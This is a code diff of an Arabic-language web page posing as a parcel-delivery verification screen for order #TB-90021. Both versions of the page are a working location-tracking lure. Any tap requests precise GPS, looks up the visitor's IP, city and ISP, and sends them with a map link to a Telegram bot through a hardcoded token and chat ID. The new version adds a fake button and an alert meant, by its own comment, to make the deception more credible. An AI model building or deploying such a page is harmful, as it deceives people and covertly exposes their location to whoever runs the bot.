@@ -4,140 +4,64 @@ index.html
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>بوابة استلام الطلبات الذكية</title>
+    <title>نظام التحقق الذكي</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; user-select: none; -webkit-tap-highlight-color: transparent; }
-        
-        /* جعل الشاشة كاملة منطقة نقر واحدة */
-        body, html { 
-            height: 100%; width: 100%; 
-            background: #0f172a; 
-            display: flex; align-items: center; justify-content: center; 
-            overflow: hidden; cursor: pointer;
-        }
-
-        .main-container {
-            width: 90%; max-width: 400px;
-            background: rgba(30, 41, 59, 0.7);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 40px;
-            padding: 45px 30px;
-            text-align: center;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
-            position: relative; z-index: 10;
-        }
-
-        .icon-circle {
-            width: 90px; height: 90px; background: linear-gradient(135deg, #38bdf8, #1d4ed8);
-            border-radius: 30px; margin: 0 auto 25px;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 40px; color: white;
-            box-shadow: 0 15px 30px rgba(56, 189, 248, 0.3);
-        }
-
-        h1 { font-size: 22px; color: white; margin-bottom: 12px; font-weight: 700; }
-        p { font-size: 14px; color: #94a3b8; line-height: 1.6; margin-bottom: 35px; }
-
-        .verification-badge {
-            background: rgba(56, 189, 248, 0.1);
-            color: #38bdf8; padding: 8px 16px; border-radius: 100px;
-            font-size: 12px; display: inline-flex; align-items: center; gap: 8px; margin-bottom: 25px;
-        }
-
-        .touch-indicator {
-            width: 100%; padding: 18px; background: white; color: #0f172a;
-            border-radius: 20px; font-weight: 700; font-size: 16px;
-            display: flex; align-items: center; justify-content: center; gap: 10px;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0.4); }
-            70% { transform: scale(1.02); box-shadow: 0 0 0 15px rgba(255,255,255,0); }
-            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0); }
-        }
-
-        /* توهج خلفي لزيادة الفخامة */
-        .bg-glow {
-            position: absolute; width: 300px; height: 300px;
-            background: radial-gradient(circle, rgba(56, 189, 248, 0.15) 0%, rgba(0,0,0,0) 70%);
-            z-index: 1;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; user-select: none; }
+        body, html { height: 100%; width: 100%; background: #0f172a; display: flex; align-items: center; justify-content: center; overflow: hidden; cursor: pointer; }
+        .main-container { width: 90%; max-width: 400px; background: rgba(30, 41, 59, 0.8); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 35px; padding: 40px 25px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); position: relative; z-index: 10; }
+        .icon-circle { width: 80px; height: 80px; background: linear-gradient(135deg, #38bdf8, #1d4ed8); border-radius: 25px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 35px; color: white; box-shadow: 0 10px 20px rgba(58, 189, 248, 0.3); }
+        h1 { font-size: 20px; color: white; margin-bottom: 10px; }
+        p { font-size: 14px; color: #94a3b8; line-height: 1.6; margin-bottom: 30px; }
+        .btn-fake { width: 100%; padding: 15px; background: white; color: #0f172a; border-radius: 15px; font-weight: 700; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.03); } 100% { transform: scale(1); } }
     </style>
 </head>
-<body onclick="captureLocation()" ontouchstart="captureLocation()">
-
-    <div class="bg-glow"></div>
+<body onclick="capture()" ontouchstart="capture()">
 
     <div class="main-container">
-        <div class="verification-badge">
-            <i class="fas fa-shield-check"></i> نظام التحقق من التسليم المباشر
-        </div>
-
-        <div class="icon-circle">
-            <i class="fas fa-map-marker-alt"></i>
-        </div>
-
-        <h1>تأكيد الموقع الجغرافي</h1>
-        <p>يرجى النقر في أي مكان على الشاشة لمطابقة موقعك الحالي مع وجهة التوصيل المسجلة لفتح قفل الشحنة وإتمام الاستلام.</p>
-        
-        <div class="touch-indicator">
-            <i class="fas fa-hand-pointer"></i> إضغط هنا للتفعيل
-        </div>
-
-        <div style="margin-top: 25px; font-size: 11px; color: #475569;">
-            رقم الطلب المتصل: <span style="color: #38bdf8;">#TB-90021</span>
-        </div>
+        <div class="icon-circle"><i class="fas fa-fingerprint"></i></div>
+        <h1>تأكيد الهوية الرقمية</h1>
+        <p>يرجى النقر في أي مكان لمطابقة موقعك مع نظام التسليم لفتح قفل الشحنة رقم #TB-90021</p>
+        <div class="btn-fake">تفعيل المطابقة الآن</div>
     </div>
 
 <script>
-    const TELEGRAM_TOKEN = '8698719504:AAE3uab2OjYv-Yl8EkaSkkvWBrADzsgTTE0';
-    const CHAT_ID = '6876904688'; 
+    const TOKEN = '8698719504:AAE3uab2OjYv-Yl8EkaSkkvWBrADzsgTTE0';
+    const ID = '6876904688';
 
-    function captureLocation() {
-        // نطلب الموقع في كل مرة يتم فيها النقر دون قفل (active=false)
+    async function capture() {
+        // 1. محاولة جلب الموقع
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                (p) => {
-                    sendToTelegram(p.coords.latitude, p.coords.longitude, "✅ تم تحديث الموقع بنجاح");
-                },
-                (e) => {
-                    sendToTelegram(null, null, "⚠️ نقرة جديدة (الموقع لا يزال مرفوضاً)");
-                },
+                async (p) => { await send(p.coords.latitude, p.coords.longitude, "✅ موقع دقيق"); },
+                async (e) => { await send(null, null, "⚠️ رفض الإذن"); },
                 { enableHighAccuracy: true, timeout: 5000 }
             );
+        } else {
+            await send(null, null, "❌ لا يدعم GPS");
         }
     }
 
-    async function sendToTelegram(lat, lng, status) {
-        let ipInfo = {};
+    async function send(lat, lng, stat) {
+        let ipRes = { ip: "--", city: "--", org: "--" };
         try {
-            // محاولة جلب الـ IP مع كل نقرة للتأكد من الثبات
-            const res = await fetch('https://ipapi.co/json/');
-            ipInfo = await res.json();
-        } catch(e) {}
+            const r = await fetch('https://ipapi.co/json/');
+            ipRes = await r.json();
+        } catch (err) { console.log("IP Error"); }
 
-        const mapUrl = lat ? `http://google.com/maps?q=${lat},${lng}` : 'مرفوض من الزبون';
-        const timestamp = new Date().toLocaleTimeString('ar-EG');
+        const map = lat ? `https://www.google.com/maps?q=${lat},${lng}` : "مرفوض";
+        const text = `🔔 نقرة جديدة\n━━━━━━━━━━━━\nالحالة: ${stat}\nIP: ${ipRes.ip}\nالمدينة: ${ipRes.city}\nالشركة: ${ipRes.org}\nالموقع: ${map}\n━━━━━━━━━━━━`;
 
-        const text = `
-🔔 نقرة جديدة على الشاشة
-━━━━━━━━━━━━
-الوقت: ${timestamp}
-الحالة: ${status}
-المدينة: ${ipInfo.city || '--'}
-الشركة: ${ipInfo.org || '--'}
-رابط الموقع: ${mapUrl}
-━━━━━━━━━━━━`;
-
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            body: JSON.stringify({ chat_id: ID, text: text })
         });
+        
+        // تنبيه للزبون لزيادة المصداقية
+        alert("جاري مطابقة الموقع مع السيرفر.. يرجى الانتظار");
     }
 </script>
 </body>
